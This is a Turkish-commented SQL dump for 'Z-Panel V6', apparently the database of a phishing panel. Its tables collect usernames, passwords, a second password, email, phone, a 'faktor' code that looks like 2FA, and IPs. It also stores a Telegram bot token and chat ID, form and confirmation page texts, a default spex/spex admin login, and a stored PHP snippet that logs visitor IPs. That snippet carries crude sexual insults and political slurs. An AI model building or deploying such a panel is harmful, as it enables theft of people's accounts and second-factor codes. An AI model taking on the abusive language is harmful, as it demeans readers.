-- Z-Panel V6 @SpeXCodeR
-- Z-Panel Version 6.2
-- İletisim ig->@spexcoder
-- İletisim tg->@SanaHasret
--
-- Anamakine: 127.0.0.1
-- Üretim Zamanı: 04 May 2022, 15:50:00
-- Sunucu sürümü: 10.4.24-MariaDB
-- PHP Sürümü: 7.4.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `multi`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `admin`
--

CREATE TABLE `admin` (
  `user` text COLLATE utf8_turkish_ci NOT NULL,
  `pass` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `admin`
--

INSERT INTO `admin` (`user`, `pass`) VALUES
('spex', 'spex');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `banlist`
--

CREATE TABLE `banlist` (
  `ip` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `bot`
--

CREATE TABLE `bot` (
  `token` text COLLATE utf8_turkish_ci NOT NULL,
  `chat` text COLLATE utf8_turkish_ci NOT NULL,
  `tel` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `bot`
--

INSERT INTO `bot` (`token`, `chat`, `tel`) VALUES
('213123', '3123', '5555555555');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `function`
--

CREATE TABLE `function` (
  `main` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `function`
--

INSERT INTO `function` (`main`) VALUES
('<?php\r\n$spexx = (\"app/config.php\");\r\n$spexc = file_exists($spexx);\r\nif ($spexc) {\r\n// echo \"Dosya Mevcut! @spex\";\r\n}\r\nelse {\r\nheader(\"Location:install/index.php\");\r\n}\r\n$ipAdresi = $_SERVER[\"REMOTE_ADDR\"] . PHP_EOL;\r\nfile_put_contents(\"app/spex/ips.txt\", $ipAdresi, FILE_APPEND);\r\ninclude (\"app/config.php\");\r\ninclude (\"app/database/router.php\");\r\n/*\r\n-----------------------------------------------\r\nBU SCRİPT SPEX KODIR TARAFINDAN YAPILMISTIR\r\nCALANIN YADA BENIM DIYEN OROSPU EVLATLARININ\r\nANNESINI BACISIYLA EK OLARAK SIKEYIM\r\nAMINA KOYDUGUM AKP\'Lİ KÖPEKLERİ SPEX ANNENİZİ\r\nSİKER....\r\n-----------------------------------------------\r\n   - SpeX - Santa Rose - Zero - Pegasus - \r\n-----------------------------------------------\r\n  Contact : ig->@spexcoder / tg->@spexmarka \r\n-----------------------------------------------\r\n*/\r\nheader(\"Refresh:3; url=home.php\");\r\n?>');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tag`
--

CREATE TABLE `tag` (
  `sitebaslik` text COLLATE utf8_turkish_ci NOT NULL,
  `siteaciklama` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `tag`
--

INSERT INTO `tag` (`sitebaslik`, `siteaciklama`) VALUES
('asdasd', 'asdasd');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `user` text COLLATE utf8_turkish_ci NOT NULL,
  `pass` text COLLATE utf8_turkish_ci NOT NULL,
  `pass2` text COLLATE utf8_turkish_ci NOT NULL,
  `mail` text COLLATE utf8_turkish_ci NOT NULL,
  `no` text COLLATE utf8_turkish_ci NOT NULL,
  `faktor` text COLLATE utf8_turkish_ci NOT NULL,
  `ip` text COLLATE utf8_turkish_ci NOT NULL,
  `tarih` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci COMMENT='SPeX COder kodır hekır istte amq';

--
-- Tablo döküm verisi `users`
--

INSERT INTO `users` (`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES
(35, 'spexcoder', 'asdasd', 'dasdasd', 'Null', 'Null', '123123', '::1\r\n', '2022-04-27 18:34:47'),
(36, 'spexcoder', 'asdaasda', 'dasdasd', 'Null', 'Null', '123123', '::1\r\n', '2022-04-27 18:36:37'),
(37, 'spexcoder', 'aasdasd', 'dasdasd', 'Null', 'Null', '123123', '::1\r\n', '2022-04-27 18:49:15'),
(39, 'zuck', 'pasdpoasldp', 'Null', 'Null', 'Null', 'Null', '::1', '2022-05-02 17:54:23'),
(40, 'asdasda', 'sdasd', 'Null', 'Null', 'Null', 'Null', '::1', '2022-05-02 19:56:57'),
(41, 'asdasd2112', 'sadasda', 'Null', 'Null', 'Null', 'Null', '::1', '2022-05-02 19:57:23'),
(45, 'spexcoder', 'adasd', 'dasdasd', 'asdasda@dasad', '123123', 'Null', '::1', '2022-05-03 14:13:16'),
(46, 'asdad', 'spexx', 'asdasdad', 'spexx@asd', 'Null', 'Null', '::1', '2022-05-03 15:04:51'),
(47, 'spexcoder', 'dasdad', 'dasdasd', 'asdasd@dawsdasd', 'Null', 'Null', '::1', '2022-05-03 15:42:00'),
(48, 'spexcoder', 'sdasdasda', 'dasdasd', 'sdadasd@dasdas', 'Null', 'Null', '::1', '2022-05-04 11:30:17'),
(49, 'asdasd', '', 'Null', 'asdasd@asda', '123123', 'Null', '::1', '2022-05-04 12:11:04'),
(50, 'asd', 'asdasd', 'asad@ad@', 'aasd@asd', 'Null', 'Null', '::1', '2022-05-04 12:16:22'),
(51, 'spexcoder', 'asdads @wdasda', 'asasdadqda@wdasda', 'Null', 'Null', 'Null', '::1', '2022-05-04 12:17:22'),
(52, 'sasdd', 'asdasd', 'asdasdasdasdasdad@dasdasd', 'Null', 'Null', 'Null', '::1', '2022-05-04 12:17:58');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `yazilar`
--

CREATE TABLE `yazilar` (
  `id` int(11) NOT NULL,
  `homebaslik` text COLLATE utf8_turkish_ci NOT NULL,
  `homeyazi` text COLLATE utf8_turkish_ci NOT NULL,
  `formbaslik` text COLLATE utf8_turkish_ci NOT NULL,
  `formyazi` text COLLATE utf8_turkish_ci NOT NULL,
  `form2baslik` text COLLATE utf8_turkish_ci NOT NULL,
  `form2yazi` text COLLATE utf8_turkish_ci NOT NULL,
  `faktorbaslik` text COLLATE utf8_turkish_ci NOT NULL,
  `faktoryazi` text COLLATE utf8_turkish_ci NOT NULL,
  `confirmedbaslik` text COLLATE utf8_turkish_ci NOT NULL,
  `confirmedyazi` text COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci COMMENT='spexxxxxxxxxxxxxxxxxxxxxxxxxxxx';

--
-- Tablo döküm verisi `yazilar`
--

INSERT INTO `yazilar` (`id`, `homebaslik`, `homeyazi`, `formbaslik`, `formyazi`, `form2baslik`, `form2yazi`, `faktorbaslik`, `faktoryazi`, `confirmedbaslik`, `confirmedyazi`) VALUES
(1, 'spexcoder', 'spexcoder', 'asdas', 'das', 'asd', 'asd', 'asdasd', 'asdsda', 'asdas', 'asda');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `yazilar`
--
ALTER TABLE `yazilar`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=53;

--
-- Tablo için AUTO_INCREMENT değeri `yazilar`
--
ALTER TABLE `yazilar`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
